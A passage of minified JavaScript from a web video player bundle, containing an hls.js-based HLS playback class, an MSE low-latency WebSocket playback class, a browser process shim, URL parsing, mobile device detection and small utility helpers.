Ta=u.f.now,ba=u.f.assign,Aa=u.f.listContainsIgnoreCase,_a=(u.a.register("PLAYBACK_FRAGMENT_CHANGED"),u.a.register("PLAYBACK_FRAGMENT_PARSING_METADATA"),function(t){P()(a,t);var i=function Ea(r){var n=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(t){return!1}}();return function(){var t,e=O()(r);return t=n?(t=O()(this).constructor,Reflect.construct(e,arguments,t)):e.apply(this,arguments),x()(this,t)}}(a);function a(){var t;o()(this,a);for(var e=arguments.length,r=new Array(e),n=0;n<e;n++)r[n]=arguments[n];return(t=i.call.apply(i,[this].concat(r))).options.playback=ya(ya({},t.options),t.options.playback),t.options.hlsPlayback=ya(ya({},t.defaultOptions),t.options.hlsPlayback),t._minDvrSize=void 0===t.options.hlsMinimumDvrSize?60:t.options.hlsMinimumDvrSize,t._extrapolatedWindowNumSegments=t.options.playback&&void 0!==t.options.playback.extrapolatedWindowNumSegments?t.options.playback.extrapolatedWindowNumSegments:2,t._playbackType=u.d.VOD,t._lastTimeUpdate={current:0,total:0},t._lastDuration=null,t._playableRegionStartTime=0,t._localStartTimeCorrelation=null,t._localEndTimeCorrelation=null,t._playableRegionDuration=0,t._programDateTime=0,t._durationExcludesAfterLiveSyncPoint=!1,t._segmentTargetDuration=null,t._playlistType=null,t._recoverAttemptsRemaining=t.options.hlsRecoverAttempts||16,t}return l()(a,[{key:"name",get:function(){return"hls"}},{key:"levels",get:function(){return this._levels||[]}},{key:"currentLevel",get:function(){return null===this._currentLevel||void 0===this._currentLevel?-1:this._currentLevel},set:function(t){this._currentLevel=t,this.trigger(u.a.PLAYBACK_LEVEL_SWITCH_START),this.options.playback.hlsUseNextLevel?this._hls.nextLevel=this._currentLevel:this._hls.currentLevel=this._currentLevel}},{key:"isReady",get:function(){return this._isReadyState}},{key:"_startTime",get:function(){return this._playbackType===u.d.LIVE&&"EVENT"!==this._playlistType?this._extrapolatedStartTime:this._playableRegionStartTime}},{key:"_now",get:function(){return Ta()}},{key:"_extrapolatedStartTime",get:function(){var t,e;return this._localStartTimeCorrelation?(e=this._localStartTimeCorrelation,t=this._now-e.local,e=(e.remote+t)/1e3,Math.min(e,this._playableRegionStartTime+this._extrapolatedWindowDuration)):this._playableRegionStartTime}},{key:"_extrapolatedEndTime",get:function(){var t,e,r=this._playableRegionStartTime+this._playableRegionDuration;return this._localEndTimeCorrelation?(e=this._localEndTimeCorrelation,t=this._now-e.local,e=(e.remote+t)/1e3,Math.max(r-this._extrapolatedWindowDuration,Math.min(e,r))):r}},{key:"_duration",get:function(){return this._extrapolatedEndTime-this._startTime}},{key:"_extrapolatedWindowDuration",get:function(){return null===this._segmentTargetDuration?0:this._extrapolatedWindowNumSegments*this._segmentTargetDuration}},{key:"bandwidthEstimate",get:function(){return this._hls&&this._hls.bandwidthEstimate}},{key:"defaultOptions",get:function(){return{preload:!1}}},{key:"customListeners",get:function(){return this.options.hlsPlayback&&this.options.hlsPlayback.customListeners||[]}},{key:"_setup",value:function(){var r=this;this._manifestParsed=!1,this._ccIsSetup=!1,this._ccTracksUpdated=!1,this._hls&&this._hls.destroy(),this._hls=new C(ba({},this.options.playback.hlsjsConfig)),this._hls.once(C.Events.MEDIA_ATTACHED,(function(){r.options.hlsPlayback.preload&&r._hls.loadSource(r.options.src)})),this._hls.on(C.Events.MANIFEST_PARSED,(function(){r._manifestParsed=!0})),this._hls.on(C.Events.LEVEL_LOADED,(function(t,e){return r._updatePlaybackType(t,e)})),this._hls.on(C.Events.LEVEL_UPDATED,(function(t,e){return r._onLevelUpdated(t,e)})),this._hls.on(C.Events.LEVEL_SWITCHING,(function(t,e){return r._onLevelSwitch(t,e)})),this._hls.on(C.Events.FRAG_CHANGED,(function(t,e){return r._onFragmentChanged(t,e)})),this._hls.on(C.Events.FRAG_LOADED,(function(t,e){return r._onFragmentLoaded(t,e)})),this._hls.on(C.Events.FRAG_PARSING_METADATA,(function(t,e){return r._onFragmentParsingMetadata(t,e)})),this._hls.on(C.Events.ERROR,(function(t,e){return r._onHLSJSError(t,e)})),this._hls.on(C.Events.SUBTITLE_TRACK_LOADED,(function(t,e){return r._onSubtitleLoaded(t,e)})),this._hls.on(C.Events.SUBTITLE_TRACKS_UPDATED,(function(){return r._ccTracksUpdated=!0})),this.bindCustomListeners(),this.checkIfCritical(),this._hls.attachMedia(this.el)}},{key:"bindCustomListeners",value:function(){var n=this;this.customListeners.forEach((function(t){var e=t.eventName,r=t.once?"once":"on";e&&n._hls["".concat(r)](e,t.callback)}))}},{key:"unbindCustomListeners",value:function(){var r=this;this.customListeners.forEach((function(t){var e=t.eventName;e&&r._hls.off(e,t.callback)}))}},{key:"_onFragmentParsingMetadata",value:function(t,e){this.trigger(u.a.Custom.PLAYBACK_FRAGMENT_PARSING_METADATA,{evt:t,data:e})}},{key:"render",value:function(){return this._ready(),d()(O()(a.prototype),"render",this).call(this)}},{key:"_ready",value:function(){this._isReadyState||(this._hls||this._setup(),this._isReadyState=!0,this.trigger(u.a.PLAYBACK_READY,this.name))}},{key:"_recover",value:function(t,e,r){var n=this;this._recoveredDecodingError?this._recoveredAudioCodecError?(u.c.error("hlsjs: failed to recover",{evt:t,data:e}),r.level=u.e.Levels.FATAL,t=this.createError(r),this.trigger(u.a.PLAYBACK_ERROR,t),this.stop()):(this._recoveredAudioCodecError=!0,this._hls.swapAudioCodec(),this._hls.recoverMediaError(),this.$el[0].play().then((function(){n._recoveredAudioCodecError=!1}))):(this._recoveredDecodingError=!0,this._hls.recoverMediaError(),this.$el[0].play())}},{key:"_setupSrc",value:function(t){}},{key:"_startTimeUpdateTimer",value:function(){var t=this;this._timeUpdateTimer||(this._timeUpdateTimer=setInterval((function(){t._onDurationChange(),t._onTimeUpdate()}),100))}},{key:"_stopTimeUpdateTimer",value:function(){this._timeUpdateTimer&&(clearInterval(this._timeUpdateTimer),this._timeUpdateTimer=null)}},{key:"getProgramDateTime",value:function(){return this._programDateTime}},{key:"getDuration",value:function(){return this._duration}},{key:"getCurrentTime",value:function(){return Math.max(0,this.el.currentTime-this._startTime)}},{key:"getStartTimeOffset",value:function(){return this._startTime}},{key:"seekPercentage",value:function(t){var e=this._duration;0<t&&(e=this._duration*(t/100)),this.seek(e)}},{key:"seek",value:function(t){t<0&&(u.c.warn("Attempt to seek to a negative time. Resetting to live point. Use seekToLivePoint() to seek to the live point."),t=this.getDuration()),this.dvrEnabled&&this._updateDvr(t<this.getDuration()-3),t+=this._startTime,this.el.currentTime=t}},{key:"seekToLivePoint",value:function(){this.seek(this.getDuration())}},{key:"_updateDvr",value:function(t){this.trigger(u.a.PLAYBACK_DVR,t),this.trigger(u.a.PLAYBACK_STATS_ADD,{dvr:t})}},{key:"_updateSettings",value:function(){this._playbackType===u.d.VOD?this.settings.left=["playpause","position","duration"]:this.dvrEnabled?this.settings.left=["playpause"]:this.settings.left=["playstop"],this.settings.seekEnabled=this.isSeekEnabled(),this.trigger(u.a.PLAYBACK_SETTINGSUPDATE)}},{key:"_onHLSJSError",value:function(t,e){var r,n={code:"".concat(e.type,"_").concat(e.details),description:"".concat(this.name," error: type: ").concat(e.type,", details: ").concat(e.details),raw:e};if(e.response&&(n.description+=", response: ".concat(JSON.stringify(e.response))),e.fatal)if(0<this._recoverAttemptsRemaining)switch(--this._recoverAttemptsRemaining,e.type){case C.ErrorTypes.NETWORK_ERROR:switch(e.details){case C.ErrorDetails.MANIFEST_LOAD_ERROR:case C.ErrorDetails.MANIFEST_LOAD_TIMEOUT:case C.ErrorDetails.MANIFEST_PARSING_ERROR:case C.ErrorDetails.LEVEL_LOAD_ERROR:case C.ErrorDetails.LEVEL_LOAD_TIMEOUT:u.c.error("hlsjs: unrecoverable network fatal error.",{evt:t,data:e}),r=this.createError(n),this.trigger(u.a.PLAYBACK_ERROR,r),this.stop();break;default:u.c.warn("hlsjs: trying to recover from network error.",{evt:t,data:e}),n.level=u.e.Levels.WARN,this._hls.startLoad()}break;case C.ErrorTypes.MEDIA_ERROR:u.c.warn("hlsjs: trying to recover from media error.",{evt:t,data:e}),n.level=u.e.Levels.WARN,this._recover(t,e,n);break;default:u.c.error("hlsjs: could not recover from error.",{evt:t,data:e}),r=this.createError(n),this.trigger(u.a.PLAYBACK_ERROR,r),this.stop()}else u.c.error("hlsjs: could not recover from error after maximum number of attempts.",{evt:t,data:e}),r=this.createError(n),this.trigger(u.a.PLAYBACK_ERROR,r),this.stop();else this.options.playback.triggerFatalErrorOnResourceDenied&&this._keyIsDenied(e)?(u.c.error("hlsjs: could not load decrypt key.",{evt:t,data:e}),r=this.createError(n),this.trigger(u.a.PLAYBACK_ERROR,r),this.stop()):(n.level=u.e.Levels.WARN,u.c.warn("hlsjs: non-fatal error occurred",{evt:t,data:e}))}},{key:"_keyIsDenied",value:function(t){return t.type===C.ErrorTypes.NETWORK_ERROR&&t.details===C.ErrorDetails.KEY_LOAD_ERROR&&t.response&&400<=t.response.code}},{key:"_onTimeUpdate",value:function(){var t={current:this.getCurrentTime(),total:this.getDuration(),firstFragDateTime:this.getProgramDateTime()};this._lastTimeUpdate&&t.current===this._lastTimeUpdate.current&&t.total===this._lastTimeUpdate.total||(this._lastTimeUpdate=t,this.trigger(u.a.PLAYBACK_TIMEUPDATE,t,this.name))}},{key:"_onDurationChange",value:function(){var t=this.getDuration();this._lastDuration!==t&&(this._lastDuration=t,d()(O()(a.prototype),"_onDurationChange",this).call(this))}},{key:"_onProgress",value:function(){if(this.el.buffered.length){for(var t=[],e=0,r=0;r<this.el.buffered.length;r++)t=[].concat(s()(t),[{start:Math.max(0,this.el.buffered.start(r)-this._playableRegionStartTime),end:Math.max(0,this.el.buffered.end(r)-this._playableRegionStartTime)}]),this.el.currentTime>=t[r].start&&this.el.currentTime<=t[r].end&&(e=r);var n={start:t[e].start,current:t[e].end,total:this.getDuration()};this.trigger(u.a.PLAYBACK_PROGRESS,n,t)}}},{key:"play",value:function(){this._hls||this._setup(),this._manifestParsed||this.options.hlsPlayback.preload||this._hls.loadSource(this.options.src),d()(O()(a.prototype),"play",this).call(this),this._startTimeUpdateTimer()}},{key:"pause",value:function(){this._hls&&(this.el.pause(),this.dvrEnabled)&&this._updateDvr(!0)}},{key:"stop",value:function(){this._stopTimeUpdateTimer(),this._hls&&(d()(O()(a.prototype),"stop",this).call(this),this._hls.destroy(),delete this._hls)}},{key:"destroy",value:function(){this._stopTimeUpdateTimer(),this._hls&&(this._hls.destroy(),delete this._hls),d()(O()(a.prototype),"destroy",this).call(this)}},{key:"_updatePlaybackType",value:function(t,e){this._playbackType=e.details.live?u.d.LIVE:u.d.VOD,this._onLevelUpdated(t,e),this._ccTracksUpdated&&this._playbackType===u.d.LIVE&&this.hasClosedCaptionsTracks&&this._onSubtitleLoaded()}},{key:"_fillLevels",value:function(){this._levels=this._hls.levels.map((function(t,e){return{id:e,level:t,label:"".concat(t.bitrate/1e3,"Kbps")}})),this.trigger(u.a.PLAYBACK_LEVELS_AVAILABLE,this._levels)}},{key:"_onLevelUpdated",value:function(t,e){this._segmentTargetDuration=e.details.targetduration,this._playlistType=e.details.type||null;var r,n,i=!1,a=!1,s=e.details.fragments,o=this._playableRegionStartTime,l=this._playableRegionDuration;0!==s.length&&(s[0].rawProgramDateTime&&(this._programDateTime=s[0].rawProgramDateTime),this._playableRegionStartTime!==s[0].start&&(i=!0,this._playableRegionStartTime=s[0].start),i&&(this._localStartTimeCorrelation?(r=this._localStartTimeCorrelation,n=this._now-r.local,(r=(r.remote+n)/1e3)<s[0].start?this._localStartTimeCorrelation={local:this._now,remote:1e3*s[0].start}:r>o+this._extrapolatedWindowDuration&&(this._localStartTimeCorrelation={local:this._now,remote:1e3*Math.max(s[0].start,o+this._extrapolatedWindowDuration)})):this._localStartTimeCorrelation={local:this._now,remote:1e3*(s[0].start+this._extrapolatedWindowDuration/2)}),n=e.details.totalduration,this._playbackType===u.d.LIVE&&((r=e.details.targetduration*((this.options.playback.hlsjsConfig||{}).liveSyncDurationCount||C.DefaultConfig.liveSyncDurationCount))<=n?(n-=r,this._durationExcludesAfterLiveSyncPoint=!0):this._durationExcludesAfterLiveSyncPoint=!1),n!==this._playableRegionDuration&&(a=!0,this._playableRegionDuration=n),(e=s[0].start+n)!==(r=o+l)&&(!this._localEndTimeCorrelation||(s=this._localEndTimeCorrelation,n=this._now-s.local,e<(o=(s.remote+n)/1e3))?this._localEndTimeCorrelation={local:this._now,remote:1e3*e}:o<e-this._extrapolatedWindowDuration?this._localEndTimeCorrelation={local:this._now,remote:1e3*(e-this._extrapolatedWindowDuration)}:r<o&&(this._localEndTimeCorrelation={local:this._now,remote:1e3*r})),a&&this._onDurationChange(),i)&&this._onProgress()}},{key:"_onFragmentChanged",value:function(t,e){var r=this.options.onTagCallback;r&&r(e.frag.tagList),this.trigger(u.a.Custom.PLAYBACK_FRAGMENT_CHANGED,e)}},{key:"_onFragmentLoaded",value:function(t,e){this.trigger(u.a.PLAYBACK_FRAGMENT_LOADED,e)}},{key:"_onSubtitleLoaded",value:function(){var t;this._ccIsSetup||(this.trigger(u.a.PLAYBACK_SUBTITLE_AVAILABLE),t=this._playbackType===u.d.LIVE?-1:this.closedCaptionsTrackId,this.closedCaptionsTrackId=t,this._ccIsSetup=!0)}},{key:"_onLevelSwitch",value:function(t,e){this.levels.length||this._fillLevels(),this.trigger(u.a.PLAYBACK_LEVEL_SWITCH_END),this.trigger(u.a.PLAYBACK_LEVEL_SWITCH,e);var r=this._hls.levels[e.level];r&&(this.highDefinition=720<=r.height||2e3<=r.bitrate/1e3,this.trigger(u.a.PLAYBACK_HIGHDEFINITIONUPDATE,this.highDefinition),this.trigger(u.a.PLAYBACK_BITRATE,{height:r.height,width:r.width,bandwidth:r.bitrate,bitrate:r.bitrate,level:e.level}))}},{key:"dvrEnabled",get:function(){return this._durationExcludesAfterLiveSyncPoint&&this._duration>=this._minDvrSize&&this.getPlaybackType()===u.d.LIVE}},{key:"getPlaybackType",value:function(){return this._playbackType}},{key:"isSeekEnabled",value:function(){return this._playbackType===u.d.VOD||this.dvrEnabled}},{key:"checkIfCritical",value:function(){var r=this;this._options.mediaInfo.then((function(t){var e=t.criticalError;t=t.errorCodec;e&&(r._isReadyState=!1,r.stop(),r.trigger(u.a.PLAYBACK_ERROR,{UI:{title:"Playback error",message:"Could not play ".concat(t||"this"," codec")},raw:{response:{critical:!0}}}),r._hls)&&r._hls.destroy()}))}}],[{key:"HLSJS",get:function(){return C}}]),a}(u.b));_a.canPlay=function(t,e){return t=1<(t=t.split("?")[0].match(/.*\.(.*)$/)||[]).length&&"m3u8"===t[1].toLowerCase()||Aa(e,["application/vnd.apple.mpegurl","application/x-mpegURL"]),!(!C.isSupported()||!t)}},function(t,e){var r,n;t=t.exports={};function i(){throw new Error("setTimeout has not been defined")}function a(){throw new Error("clearTimeout has not been defined")}try{r="function"==typeof setTimeout?setTimeout:i}catch(t){r=i}try{n="function"==typeof clearTimeout?clearTimeout:a}catch(t){n=a}function s(e){if(r===setTimeout)return setTimeout(e,0);if((r===i||!r)&&setTimeout)return(r=setTimeout)(e,0);try{return r(e,0)}catch(t){try{return r.call(null,e,0)}catch(t){return r.call(this,e,0)}}}var o,l=[],u=!1,h=-1;function c(){u&&o&&(u=!1,o.length?l=o.concat(l):h=-1,l.length)&&d()}function d(){if(!u){for(var t=s(c),e=(u=!0,l.length);e;){for(o=l,l=[];++h<e;)o&&o[h].run();h=-1,e=l.length}o=null,u=!1,function(e){if(n===clearTimeout)return clearTimeout(e);if((n===a||!n)&&clearTimeout)return(n=clearTimeout)(e);try{n(e)}catch(t){try{return n.call(null,e)}catch(t){return n.call(this,e)}}}(t)}}function f(t,e){this.fun=t,this.array=e}function p(){}t.nextTick=function(t){var e=new Array(arguments.length-1);if(1<arguments.length)for(var r=1;r<arguments.length;r++)e[r-1]=arguments[r];l.push(new f(t,e)),1!==l.length||u||s(d)},f.prototype.run=function(){this.fun.apply(null,this.array)},t.title="browser",t.browser=!0,t.env={},t.argv=[],t.version="",t.versions={},t.on=p,t.addListener=p,t.once=p,t.off=p,t.removeListener=p,t.removeAllListeners=p,t.emit=p,t.prependListener=p,t.prependOnceListener=p,t.listeners=function(t){return[]},t.binding=function(t){throw new Error("process.binding is not supported")},t.cwd=function(){return"/"},t.chdir=function(t){throw new Error("process.chdir is not supported")},t.umask=function(){return 0}},,,,,,,,,,,,,,,,,,,,,,,function(t,e,r){"use strict";r=r(370),t.exports=Function.prototype.bind||r},function(t,e,r){"use strict";var n=String.prototype.replace,i=/%20/g,s="RFC3986";t.exports={default:s,formatters:{RFC1738:function(t){return n.call(t,i,"+")},RFC3986:function(t){return String(t)}},RFC1738:"RFC1738",RFC3986:s}},function(t,e,r){"use strict";var s=(r=r(362)).parse,o=r.Url;function n(t){var e,r=t.url;if(void 0!==r)return a(r,e=t._parsedUrl)?e:((e=i(r))._raw=r,t._parsedUrl=e)}function i(t){if("string"!=typeof t||47!==t.charCodeAt(0))return s(t);for(var e=t,r=null,n=null,i=1;i<t.length;i++)switch(t.charCodeAt(i)){case 63:null===n&&(e=t.substring(0,i),r=t.substring(i+1),n=t.substring(i));break;case 9:case 10:case 12:case 13:case 32:case 35:case 160:case 65279:return s(t)}var a=void 0!==o?new o:{};return a.path=t,a.href=t,a.pathname=e,null!==n&&(a.query=r,a.search=n),a}function a(t,e){return"object"==typeof e&&null!==e&&(void 0===o||e instanceof o)&&e._raw===t}t.exports=n,t.exports.original=function(t){var e=t.originalUrl;if("string"!=typeof e)return n(t);var r=t._parsedOriginalUrl;return a(e,r)?r:((r=i(e))._raw=e,t._parsedOriginalUrl=r)}},function(t,e,r){var n,i,a,s,o,l,u,h,c,d,f,p,g,v,m,y,E;function T(t,e){return t.test(e)}function b(t){var e=(t=t||navigator.userAgent).split("[FBAN");if(void 0!==(e=(t=void 0!==e[1]?e[0]:t).split("Twitter"))[1]&&(t=e[0]),this.apple={phone:T(a,t),ipod:T(s,t),tablet:!T(a,t)&&T(o,t),device:T(a,t)||T(s,t)||T(o,t)},this.amazon={phone:T(h,t),tablet:!T(h,t)&&T(c,t),device:T(h,t)||T(c,t)},this.android={phone:T(h,t)||T(l,t),tablet:!T(h,t)&&!T(l,t)&&(T(c,t)||T(u,t)),device:T(h,t)||T(c,t)||T(l,t)||T(u,t)},this.windows={phone:T(d,t),tablet:T(f,t),device:T(d,t)||T(f,t)},this.other={blackberry:T(p,t),blackberry10:T(g,t),opera:T(v,t),firefox:T(y,t),chrome:T(m,t),device:T(p,t)||T(g,t)||T(v,t)||T(y,t)||T(m,t)},this.seven_inch=T(E,t),this.any=this.apple.device||this.android.device||this.windows.device||this.other.device||this.seven_inch,this.phone=this.apple.phone||this.android.phone||this.windows.phone,this.tablet=this.apple.tablet||this.android.tablet||this.windows.tablet,"undefined"==typeof window)return this}function A(){var t=new b;return t.Class=b,t}i=this,a=/iPhone/i,s=/iPod/i,o=/iPad/i,l=/(?=.*\bAndroid\b)(?=.*\bMobile\b)/i,u=/Android/i,h=/(?=.*\bAndroid\b)(?=.*\bSD4930UR\b)/i,c=/(?=.*\bAndroid\b)(?=.*\b(?:KFOT|KFTT|KFJWI|KFJWA|KFSOWI|KFTHWI|KFTHWA|KFAPWI|KFAPWA|KFARWI|KFASWI|KFSAWI|KFSAWA)\b)/i,d=/Windows Phone/i,f=/(?=.*\bWindows\b)(?=.*\bARM\b)/i,p=/BlackBerry/i,g=/BB10/i,v=/Opera Mini/i,m=/(CriOS|Chrome)(?=.*\bMobile\b)/i,y=/(?=.*\bFirefox\b)(?=.*\bMobile\b)/i,E=new RegExp("(?:Nexus 7|BNTV250|Kindle Fire|Silk|GT-P1000)","i"),t.exports&&"undefined"==typeof window?t.exports=b:t.exports&&"undefined"!=typeof window?t.exports=A():(n=[],void 0!==(e="function"==typeof(i=i.isMobile=A())?i.apply(e,n):i)&&(t.exports=e))},function(t,e,r){"use strict";r.d(e,"a",(function(){return y}));e=r(88);var n=r.n(e),s=(e=r(63),r.n(e)),i=(e=r(17),r.n(e)),o=(e=r(5),r.n(e)),l=(e=r(6),r.n(e)),u=(e=r(7),r.n(e)),h=(e=r(8),r.n(e)),a=(e=r(9),r.n(e)),c=(e=r(3),r.n(e)),d=(e=r(64),r.n(e)),f=r(1),p=(e=r(92),r.n(e));function g(e,t){var r,n=Object.keys(e);return Object.getOwnPropertySymbols&&(r=Object.getOwnPropertySymbols(e),t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)),n}function v(e){for(var t=1;t<arguments.length;t++){var r=null!=arguments[t]?arguments[t]:{};t%2?g(Object(r),!0).forEach((function(t){i()(e,t,r[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):g(Object(r)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(r,t))}))}return e}function m(r){var n=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(t){return!1}}();return function(){var t,e=c()(r);return t=n?(t=c()(this).constructor,Reflect.construct(e,arguments,t)):e.apply(this,arguments),a()(this,t)}}var y=function(t){h()(a,t);var e,i=m(a);function a(){var t;o()(this,a);for(var e=arguments.length,r=new Array(e),n=0;n<e;n++)r[n]=arguments[n];return(t=i.call.apply(i,[this].concat(r))).options.playback=v(v({},t.options),t.options.playback),t.mustDestroy=!1,t._paused=!1,t.firstPlay=!0,t}return l()(a,[{key:"name",get:function(){return"mseld"}},{key:"supportedVersion",get:function(){return{min:"0.4.18"}}},{key:"levels",get:function(){return this._levels||[]}},{key:"currentLevel",get:function(){return null===this._currentLevel||void 0===this._currentLevel?-1:this._currentLevel},set:function(t){this._currentLevel=t,this.trigger(f.Events.PLAYBACK_LEVEL_SWITCH_START),this.setTracks(t)}},{key:"init",value:function(){var i=this,t=this.options.src;t=p.a.replaceHttpByWS(t);return this.options.autoplay&&!this.options.mute&&(this.el.autoplay=!1,this.el.muted=!0,this.el.volume=0),this.MSE=new p.a(this.el,t,{debug:!0,connectionRetries:0,errorsBeforeStop:0,onCrashTryVideoOnly:!1,wsReconnect:!1,statsSendEnable:!1,onError:function(t){var e;t&&!t.type&&i.trigger(f.Events.PLAYBACK_ERROR,t),t&&(e=t.error,t=t.code,"WebSocket lost connection"===e)&&1e3===t&&(i.playingStarted=!1,i.stop())},onMediaInfo:function(t){var e,r;(e=i.options.onMediaInfo)&&"function"==typeof e&&((r=t.streams||t.tracks)&&0<r.length&&(i._levels=r.filter((function(t){return t.content&&"audio"===t.content&&(i.audio=t),!(!t.content||"video"!==t.content)})).map((function(t,e){return{id:e,level:t.size||0,label:"".concat(t.bitrate,"Kbps"),bitrate:t.bitrate,track_id:t.track_id}})),i.trigger(f.Events.PLAYBACK_LEVELS_AVAILABLE,i._levels)),e(t))},onProgress:function(){i.playingStarted=!0,i.trigger(f.Events.PLAYBACK_BUFFERFULL);var r,n,t=i.options.tracks;t&&2<=t.length&&!1!==i.firstPlay&&(r=s()(t),n=[],r.forEach((function(t,e){(e+1)%2==0&&n.push(r[e-1]+r[e])})),i.MSE.setTracks(n),i.firstPlay=!1)},onStartStalling:function(){i.trigger(f.Events.PLAYBACK_BUFFERING)},onEndStalling:function(){i.trigger(f.Events.PLAYBACK_BUFFERFULL)},onPause:function(){i.trigger(f.Events.PLAYBACK_STOP)},onEvent:function(t){}}),this.MSE}},{key:"_startTimeUpdateTimer",value:function(){var t=this;this._timeUpdateTimer=setInterval((function(){t._onTimeUpdate()}),100)}},{key:"_onTimeUpdate",value:function(){var t={current:this.getCurrentTime(),total:this.getDuration()};this._lastTimeUpdate&&t.current===this._lastTimeUpdate.current||(this._lastTimeUpdate=t,this.trigger(f.Events.PLAYBACK_TIMEUPDATE,t,this.name))}},{key:"_updateSettings",value:function(){this.settings.left=["playstop"],this.trigger(f.Events.PLAYBACK_SETTINGSUPDATE)}},{key:"_onDurationChange",value:function(){var t=this.getDuration();this._lastDuration!==t&&(this._lastDuration=t,u()(c()(a.prototype),"_onDurationChange",this).call(this))}},{key:"_stopTimeUpdateTimer",value:function(){clearInterval(this._timeUpdateTimer)}},{key:"getPlaybackType",value:function(){return f.Playback.LIVE}},{key:"destroy",value:function(){var t=this;this.playPromise?(this.playPromise.catch((function(){t.stop()})).finally((function(){t.stop()})),this._stopTimeUpdateTimer(),u()(c()(a.prototype),"destroy",this).call(this)):this.mustDestroy=!0}},{key:"resolveRedirect",value:function(e){return fetch(e,{method:"OPTIONS"}).catch((function(t){return e})).then((function(t){return t.headers&&t.headers.get("location")?t.headers.get("location"):e}))}},{key:"getStartTimeOffset",value:function(){return this.getCurrentTime()}},{key:"_handleBufferingEvents",value:function(){}},{key:"isSeekEnabled",value:function(){return!1}},{key:"attemptAutoPlay",value:(e=n()(d.a.mark((function t(){var e=this;return d.a.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.next=2,this.checkIfCritical().then((function(){e.criticalError||e.MSE||(e.init(),e._onProgress=e.MSE.onProgress.bind(e),e.play())}));case 2:case"end":return t.stop()}}),t,this)}))),function(){return e.apply(this,arguments)})},{key:"_onError",value:function(){}},{key:"play",value:function(){var t=this;this.criticalError||this.playingStarted||(this.trigger(f.Events.PLAYBACK_PLAY_INTENT),this.MSE||this.init(),this.playPromise=this.MSE.play(),this.playPromise&&this.playPromise.then((function(){t._ready(),t.playingStarted=!0,t._stopped=!1,t.trigger(f.Events.PLAYBACK_BUFFERING),t.mustDestroy&&t.destroy()})).catch((function(){t.mustDestroy&&t.destroy()})).finally((function(){t.trigger(f.Events.MEDIACONTROL_PLAYING)})),this._startTimeUpdateTimer())}},{key:"pause",value:function(){this.MSE&&(this._paused?(this.MSE.play(),this._paused=!1):(this.MSE.pause(),this._paused=!0))}},{key:"isPlaying",value:function(){return this.playingStarted||!1}},{key:"setTracks",value:function(t){var e,r;t=-1===t?0:t;this.MSE&&(this.audio&&this.audio.track_id&&(e=this.audio.track_id),r=[],this._levels[t]&&r.push(this._levels[t].track_id),void 0!==e&&r.push(e),0<r.length)&&this.MSE.setTracks(r),this.trigger(f.Events.PLAYBACK_LEVEL_SWITCH_END)}},{key:"getStats",value:function(){return this.MSE.getStats()}},{key:"_ready",value:function(){this.trigger(f.Events.PLAYBACK_READY)}},{key:"setWaitStatus",value:function(t){this._waitStatus=t}},{key:"stop",value:function(){this.MSE?(this.MSE.stop(),u()(c()(a.prototype),"stop",this).call(this),this.trigger(f.Events.PLAYBACK_STOP),this.playingStarted=!1,this.MSE=void 0):this.mustDestroy=!0}},{key:"checkIfCritical",value:function(){var n=this;return new Promise((function(r,t){n._options.mediaInfo.then((function(t){var e=t.criticalError;t=t.errorCodec;return e&&(n.destroy(),n.criticalError=!0,n.stop(),n.trigger(f.Events.PLAYBACK_ERROR,{UI:{title:"Playback error",message:"Could not play ".concat(t||"this"," codec")},raw:{response:{critical:!0}}})),r()}))}))}}],[{key:"MSELD",get:function(){return a}}]),a}(f.HTML5Video);y.isSupported=function(){return p.a.isSupported()},y.canPlay=function(t,e){return(-1!==t.indexOf("mse_ld")||"application/x-flussonic-mse"===e)&&y.isSupported()}},function(t,e,r){var n=r(62).default,i=r(200);t.exports=function(t){return t=i(t,"string"),"symbol"==n(t)?t:String(t)},t.exports.__esModule=!0,t.exports.default=t.exports},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,function(t,e){t.exports=function(t,e){(null==e||e>t.length)&&(e=t.length);for(var r=0,n=new Array(e);r<e;r++)n[r]=t[r];return n},t.exports.__esModule=!0,t.exports.default=t.exports},function(t,e,r){var n=r(153);t.exports=function(t,e){var r;if(t)return"string"==typeof t?n(t,e):"Map"===(r="Object"===(r=Object.prototype.toString.call(t).slice(8,-1))&&t.constructor?t.constructor.name:r)||"Set"===r?Array.from(t):"Arguments"===r||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(r)?n(t,e):void 0},t.exports.__esModule=!0,t.exports.default=t.exports},function(t,e){t.exports=function(t){return t.webpackPolyfill||(t.deprecate=function(){},t.paths=[],t.children||(t.children=[]),Object.defineProperty(t,"loaded",{enumerable:!0,get:function(){return t.l}}),Object.defineProperty(t,"id",{enumerable:!0,get:function(){return t.i}}),t.webpackPolyfill=1),t}},function(t,e,r){"use strict";function n(){if(i)try{return i({},"a",{value:1}),!0}catch(t){}return!1}var i=r(55)("%Object.defineProperty%",!0);n.hasArrayLengthDefineBug=function(){if(!n())return null;try{return 1!==i([],"length",{value:1}).length}catch(t){return!0}},t.exports=n},function(t,e,r){"use strict";if(r=r(55)("%Object.getOwnPropertyDescriptor%",!0))try{r([],"length")}catch(t){r=null}t.exports=r},function(t,e,r){"use strict";function o(t,e){for(var r=e&&e.plainObjects?Object.create(null):{},n=0;n<t.length;++n)void 0!==t[n]&&(r[n]=t[n]);return r}var u=r(119),l=Object.prototype.hasOwnProperty,g=Array.isArray,h=function(){for(var t=[],e=0;e<256;++e)t.push("%"+((e<16?"0":"")+e.toString(16)).toUpperCase());return t}();t.exports={arrayToObject:o,assign:function(t,r){return Object.keys(r).reduce((function(t,e){return t[e]=r[e],t}),t)},combine:function(t,e){return[].concat(t,e)},compact:function(t){for(var e=[{obj:{o:t},prop:"o"}],r=[],n=0;n<e.length;++n)for(var i=e[n],a=i.obj[i.prop],s=Object.keys(a),o=0;o<s.length;++o){var l=s[o],u=a[l];"object"==typeof 